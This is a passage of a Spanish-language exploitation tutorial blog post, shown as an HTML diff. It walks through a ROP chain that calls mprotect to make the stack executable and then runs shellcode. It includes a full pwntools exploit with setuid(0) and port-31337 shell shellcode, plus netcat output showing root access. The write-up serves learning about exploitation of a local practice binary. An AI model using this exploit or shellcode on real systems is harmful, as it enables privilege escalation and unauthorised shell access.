+$1 = {&lt;text variable, no debug info&gt;} 0x7ffff7eb62f0 &lt;mprotect&gt;
+</code></pre></div></div>
+
+<h3 id="direcciones-de-los-gadgets">Direcciones de los gadgets</h3>
+
+<p>En mi caso usare ROPGadget pero puden usar ropper o radare2, aqui les puedo decir que no me arrojo ningun gadget, eso no es problema cuando se nos proporciona la libreria que esta usando, en este caso como lo compile en mi maquina, uso la libreria que se encuentra en <code class="language-plaintext highlighter-rouge">/usr/lib/libc.so.6</code>, asi que esa la podemos usar para sacar los gadgets con el comando:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdi"</code>: 0x0000000000023d35</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rsi"</code>: 0x0000000000025641</p>
+
+<p><code class="language-plaintext highlighter-rouge">ROPgadget --binary /usr/lib/libc.so.6 | grep "pop rdx"</code>: 0x000000000004e062</p>
+
+<h3 id="ejecutando-el-exploit-final">Ejecutando el exploit final</h3>
+
+<p>Despues de agregar lo que le falta tenemos este exploit:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./mprotect</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">n/sh</span><span class="se">\x68</span><span class="s">//bi</span><span class="se">\x89\xe3\x51\x53\x89\xe1\xb0\x0b</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcd\x80</span><span class="sh">"</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x007ffff7db6000</span>
+<span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">264</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="mh">0x7ffffffffe000</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7eb62f0</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000023d35</span>
+<span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x0000000000025641</span>
+<span class="n">pop_rdx</span> <span class="o">=</span> <span class="mh">0x000000000004e062</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">264</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xAAAAAAAAAAAAAAAA</span><span class="p">)</span> <span class="c1">#junk para r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x007fffffffe418</span><span class="p">)</span> <span class="c1">#direccion desde donde comenzara la shellcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><strong>Ojo:</strong> Antes de ejecutarlo hay que ponernos en escucha por el puerto 31337, ya que la shellcode ejecuta un <code class="language-plaintext highlighter-rouge">setuid(0)</code> y establece una conexion con nosotros mismos por ese puerto</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
+Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
+whoami
+root
+</code></pre></div></div>
+
+<p>Y asi conseguimos ser root, muchas gracias por leer ❤</p>
+
+<p><img src="/assets/img/heap2/waifu3.jpg" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/explotacion%20binaria/2023/01/24/picoCTF-here's-a-libc.html" title="picoCTF Here's a libc - ret2libc y bypass ASLR">picoCTF Here's a libc - ret2libc...</a><a class="next" href="/un%20poco%20de%20pentesting/2023/03/28/UPDP-sqli.html" title="Un Poco de Pentesting - SQL Injections">Un Poco de Pentesting - SQL...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/explotacion%20binaria/2022/07/30/imaginaryCTF-date2.html" title="Un Poco de Pentesting - SQL Injections">ImaginaryCTF date2 - GOT overwrite</a></li>
+<li><a class="post-link" href="/hackthebox/2023/04/05/htb-squashed.html" title="Un Poco de Pentesting - SQL Injections">HackTheBox Squashed - NFS y X11</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/01/22/rand-ld_preload.html" title="Un Poco de Pentesting - SQL Injections">Hijack de rand() usando LD_PRELOAD trick</a></li>
+<li><a class="post-link" href="/hackthebox/2023/06/12/htb-format.html" title="Un Poco de Pentesting - SQL Injections">HackTheBox Format - LFI, Redis y Python format string</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
